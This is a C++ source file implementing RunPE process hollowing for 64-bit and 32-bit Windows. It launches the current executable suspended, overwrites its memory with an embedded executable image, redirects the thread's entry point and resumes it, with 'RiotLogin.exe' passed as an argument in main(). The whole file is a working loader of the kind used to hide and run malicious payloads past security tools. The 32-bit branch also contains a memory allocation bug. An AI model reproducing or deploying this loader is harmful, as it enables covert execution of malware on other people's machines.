#include <windows.h>
#include <iostream>
#include <sstream>
#include <vector>
#include <string>

#include "runpe.h"
#include "output.h"

using namespace std;

#ifdef _WIN64
typedef IMAGE_NT_HEADERS64  IMAGE_NT_HEADERS;
typedef PIMAGE_NT_HEADERS64 PIMAGE_NT_HEADERS;
typedef IMAGE_OPTIONAL_HEADER64 IMAGE_OPTIONAL_HEADER;
typedef PIMAGE_OPTIONAL_HEADER64 PIMAGE_OPTIONAL_HEADER;
#else
typedef IMAGE_NT_HEADERS32  IMAGE_NT_HEADERS;
typedef PIMAGE_NT_HEADERS32 PIMAGE_NT_HEADERS;
typedef IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER;
typedef PIMAGE_OPTIONAL_HEADER32 PIMAGE_OPTIONAL_HEADER;
#endif 

#if _WIN64
int RunPE(void* Image, const vector<string>& args/*, char* outputBuffer, size_t outputBufferSize*/)
{
    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    CONTEXT* CTX;

    DWORD64 ImageBase;
    void* pImageBase;

    int count;
    char CurrentFilePath[1024];

    DOSHeader = PIMAGE_DOS_HEADER(Image);
    NtHeader = PIMAGE_NT_HEADERS(DWORD_PTR(Image) + DOSHeader->e_lfanew);

    GetModuleFileNameA(0, CurrentFilePath, 1024);

    if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
    {
        ZeroMemory(&PI, sizeof(PI));
        ZeroMemory(&SI, sizeof(SI));

        std::stringstream argStringStream;
        for (const auto& arg : args)
        {
            argStringStream << arg << " ";
        }
        string argString = argStringStream.str();

        if (CreateProcessA(CurrentFilePath, const_cast<char*>(argString.c_str()), NULL, NULL, TRUE,
            CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
        {
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL;

            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
            {
                ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Rdx + 0x10), LPVOID(&ImageBase), sizeof(DWORD64), 0);

                pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

                WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

                for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
                {
                    SectionHeader = IMAGE_FIRST_SECTION(NtHeader) + count;

                    WriteProcessMemory(PI.hProcess, LPVOID(DWORD_PTR(pImageBase) + SectionHeader->VirtualAddress),
                        LPVOID(DWORD_PTR(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
                }

                WriteProcessMemory(PI.hProcess, LPVOID(CTX->Rdx + 0x10), LPVOID(&NtHeader->OptionalHeader.ImageBase), sizeof(DWORD64), NULL);

                CTX->Rcx = DWORD_PTR(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;

                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
                ResumeThread(PI.hThread);

                return 1;
            }
        }
    }

    return 0;
}
#else
int RunPE(void* Image, const vector<string>& args/*, char* outputBuffer, size_t outputBufferSize*/)
{
    IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
    IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    CONTEXT* CTX;

    DWORD* ImageBase; //Base address of the image
    void* pImageBase; // Pointer to the image base

    int count;
    char CurrentFilePath[1024];

    DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
    NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize

    GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable

    if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
    {
        ZeroMemory(&PI, sizeof(PI)); // Null the memory
        ZeroMemory(&SI, sizeof(SI)); // Null the memory

        std::stringstream argStringStream;
        for (const auto& arg : args)
        {
            argStringStream << arg << " ";
        }
        string argString = argStringStream.str();

        if (CreateProcessA(CurrentFilePath, const_cast<char*>(argString.c_str()), NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
            //process in suspended state, for the new image.
        {
            // Allocate memory for the context.
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
            {
                // Read instructions
                ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

                pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
                    NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

                // Write the image to the process
                WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

                for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
                {
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

                    WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
                        LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
                }
                WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
                    LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

                // Move address of entry point to the eax register
                CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
                ResumeThread(PI.hThread); //´Start the process/call main()

                return 1; // Operation was successful.
            }
        }
    }

    return 0;
}
#endif

int main()
{
    vector<string> argv = { "", "RiotLogin.exe", "" };

    if (RunPE(FileToByte, argv))
        cout << "Ok." << endl;
    else
        cout << "Failed.";
}